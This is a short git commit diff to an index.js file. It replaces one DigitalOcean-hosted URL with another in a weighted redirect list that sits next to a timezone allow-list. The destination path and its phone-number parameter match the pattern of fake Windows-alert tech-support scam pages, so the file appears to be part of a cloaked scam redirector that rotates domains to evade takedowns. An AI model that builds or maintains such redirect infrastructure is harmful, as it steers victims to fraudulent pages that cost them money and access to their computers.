560fade05bb23f8b54819aaac3109a74773288de
paalakash <palaksh452@gmail.com>
2026-06-11 11:21:40 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://squid-app-sjgpq.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4025", weight: 1.0 }
+    { url: "https://seashell-app-7754h.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-4025", weight: 1.0 }
 
 ];
 
